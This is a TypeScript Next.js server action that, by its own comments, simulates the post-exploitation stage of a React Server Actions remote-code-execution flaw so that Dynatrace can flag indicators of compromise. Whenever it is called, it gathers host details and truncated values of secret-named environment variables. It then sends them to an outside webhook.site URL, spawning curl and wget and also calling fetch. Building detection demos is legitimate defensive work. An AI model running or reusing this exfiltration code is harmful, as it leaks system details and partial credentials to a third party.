'use server';

import { spawn } from 'child_process';
import os from 'os';

const DEFAULT_EXFIL_URL = 'https://webhook.site/1c129c66-a498-4463-990f-cb7072441d28';

/**
 * React2Shell (CVE-2025-55182) Server Action
 * 
 * This simulates the attack where a malicious payload exploits React Server Actions
 * argument deserialization to achieve Remote Code Execution. The actual vulnerability
 * triggers BEFORE this code runs, but we simulate the post-exploitation behavior here.
 * 
 * IoC for Dynatrace:
 * 1. Node process spawning child processes (wget, curl, sh)
 * 2. Outbound HTTP requests to attacker-controlled URLs
 * 3. Environment/secret harvesting
 */
export async function testAction(formData: FormData) {
  console.log('[react2shell] Vulnerable action triggered - simulating post-exploitation');
  
  // Simulate attacker spawning processes to exfiltrate data (IoC: process spawning)
  const exfilUrl = process.env.REACT2SHELL_EXFIL_URL || DEFAULT_EXFIL_URL;
  const payload = buildExfilPayload();
  
  // Try multiple exfiltration methods - this creates process spawn IoCs for Dynatrace
  await Promise.allSettled([
    spawnExfilProcess('curl', ['-s', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', payload, exfilUrl]),
    spawnExfilProcess('wget', ['-q', '-O', '-', '--post-data', payload, '--header', 'Content-Type: application/json', exfilUrl]),
  ]);
  
  // Also exfiltrate via fetch for span visibility
  await exfiltrateViaFetch(payload, exfilUrl);
  
  return { success: true, message: 'Action executed - check Dynatrace for IoCs' };
}

function buildExfilPayload(): string {
  const secrets: Record<string, string> = {};
  
  // Harvest environment variables (simulated secret extraction)
  for (const [key, value] of Object.entries(process.env)) {
    if (key.includes('TOKEN') || key.includes('SECRET') || key.includes('KEY') || key.includes('PASSWORD')) {
      secrets[key] = value ? `${String(value).slice(0, 4)}****` : '[empty]';
    }
  }
  
  return JSON.stringify({
    attack: 'react2shell',
    cve: 'CVE-2025-55182',
    hostname: os.hostname(),
    platform: os.platform(),
    user: os.userInfo().username,
    cwd: process.cwd(),
    secrets,
    timestamp: new Date().toISOString(),
  });
}

function spawnExfilProcess(command: string, args: string[]): Promise<{ command: string; success: boolean; error?: string }> {
  return new Promise((resolve) => {
    console.warn(`[react2shell] Spawning ${command} for exfiltration (IoC: node spawning child process)`);
    
    try {
      const child = spawn(command, args, {
        stdio: 'ignore',
        timeout: 5000,
      });
      
      child.on('error', (err: Error) => {
        console.debug(`[react2shell] ${command} spawn error:`, err.message);
        resolve({ command, success: false, error: err.message });
      });
      
      child.on('exit', (code: number | null) => {
        console.log(`[react2shell] ${command} exited with code ${code}`);
        resolve({ command, success: code === 0 });
      });
      
      // Timeout fallback
      setTimeout(() => {
        if (!child.killed) {
          child.kill('SIGTERM');
        }
        resolve({ command, success: false, error: 'timeout' });
      }, 5000);
    } catch (err) {
      resolve({ command, success: false, error: String(err) });
    }
  });
}

async function exfiltrateViaFetch(payload: string, url: string): Promise<void> {
  console.warn('[react2shell] Exfiltrating via fetch (IoC: outbound HTTP POST)');
  
  try {
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Attack': 'react2shell',
        'X-CVE': 'CVE-2025-55182',
      },
      body: payload,
    });
  } catch (error) {
    console.debug('[react2shell] fetch exfil error:', error);
  }
}
